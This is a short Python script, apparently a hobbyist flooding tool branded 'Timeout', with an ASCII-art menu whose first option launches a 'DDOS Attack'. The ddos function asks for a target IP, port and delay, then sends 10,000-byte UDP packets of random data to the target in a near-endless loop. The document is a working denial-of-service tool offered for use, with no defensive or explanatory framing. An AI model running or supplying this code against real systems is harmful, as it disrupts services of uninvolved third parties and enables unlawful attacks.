#Modules
import socket
import os
import random
import time

#DDOS Attack
def ddos():
    os.system('clear')
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    print('TO END ATTACK PRESS CTRL+C')
    ip = input('Target IP: ')
    port = int(input('Target Port: '))
    sleep = float(input('Delay Between Request: '))
    
    s.connect((ip, port))
    
    for i in range(1, 100**1000):
        s.send(random._urandom(10)*1000)
        print(f'Send: {i}', end='\r')
        time.sleep(sleep)
    

#Menu
os.system('clear')
menu = input("""
             
             
                                                                                                                                   
                                                                                                                                   
TTTTTTTTTTTTTTTTTTTTTTT  iiii                                                                                        tttt          
T:::::::::::::::::::::T i::::i                                                                                    ttt:::t          
T:::::::::::::::::::::T  iiii                                                                                     t:::::t          
T:::::TT:::::::TT:::::T                                                                                           t:::::t          
TTTTTT  T:::::T  TTTTTTiiiiiii    mmmmmmm    mmmmmmm       eeeeeeeeeeee       ooooooooooo   uuuuuu    uuuuuuttttttt:::::ttttttt    
        T:::::T        i:::::i  mm:::::::m  m:::::::mm   ee::::::::::::ee   oo:::::::::::oo u::::u    u::::ut:::::::::::::::::t    
        T:::::T         i::::i m::::::::::mm::::::::::m e::::::eeeee:::::eeo:::::::::::::::ou::::u    u::::ut:::::::::::::::::t    
        T:::::T         i::::i m::::::::::::::::::::::me::::::e     e:::::eo:::::ooooo:::::ou::::u    u::::utttttt:::::::tttttt    
        T:::::T         i::::i m:::::mmm::::::mmm:::::me:::::::eeeee::::::eo::::o     o::::ou::::u    u::::u      t:::::t          
        T:::::T         i::::i m::::m   m::::m   m::::me:::::::::::::::::e o::::o     o::::ou::::u    u::::u      t:::::t          
        T:::::T         i::::i m::::m   m::::m   m::::me::::::eeeeeeeeeee  o::::o     o::::ou::::u    u::::u      t:::::t          
        T:::::T         i::::i m::::m   m::::m   m::::me:::::::e           o::::o     o::::ou:::::uuuu:::::u      t:::::t    tttttt
      TT:::::::TT      i::::::im::::m   m::::m   m::::me::::::::e          o:::::ooooo:::::ou:::::::::::::::uu    t::::::tttt:::::t
      T:::::::::T      i::::::im::::m   m::::m   m::::m e::::::::eeeeeeee  o:::::::::::::::o u:::::::::::::::u    tt::::::::::::::t
      T:::::::::T      i::::::im::::m   m::::m   m::::m  ee:::::::::::::e   oo:::::::::::oo   uu::::::::uu:::u      tt:::::::::::tt
      TTTTTTTTTTT      iiiiiiiimmmmmm   mmmmmm   mmmmmm    eeeeeeeeeeeeee     ooooooooooo       uuuuuuuu  uuuu        ttttttttttt  
                                                                                                                                   
                                                                                                                                   
                                                                                                                                   
                                                                                                                                   
                                                                                                                                   
                                                                                                                                   
                                                                                                                                   
[1] DDOS Attack

[2] Quit
             
             """)

#Quit
if menu == '2':
    os.system('clear')
    quit()
    
#DDOS
if menu == '1':
    os.system('clear')
    ddos()
    
    